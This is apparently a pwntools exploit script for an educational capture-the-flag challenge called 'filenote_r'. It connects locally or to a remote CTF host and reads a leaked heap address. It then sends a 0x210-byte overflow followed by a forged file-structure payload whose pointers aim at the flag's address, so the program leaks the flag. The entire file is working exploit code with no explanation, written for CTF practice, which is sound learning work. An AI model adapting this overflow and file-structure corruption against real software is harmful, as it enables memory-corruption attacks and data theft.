from pwn import *

context.arch = 'amd64'
# context.binary = 'am64'
context.terminal = ['tmux', 'splitw', '-h']

if args['REMOTE']:
    p = remote('edu-ctf.zoolab.org', 30215)
else:
    p = process('./filenote_r/chal')

p.recvuntil("0x")

note_buf = int(p.recvline(), base = 16)
flag_addr = note_buf - 0x1010

print(hex(note_buf))
print(hex(flag_addr))

p.sendlineafter(">", "1")
p.sendlineafter(">", "2")

flags = 0x0800

payload = flat(
    flags, 0,
    flag_addr, 0,
    flag_addr, flag_addr + 0x50,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    1
)

p.sendlineafter("data>", b"A" * 0x210 + payload)


gdb.attach(p)

p.interactive()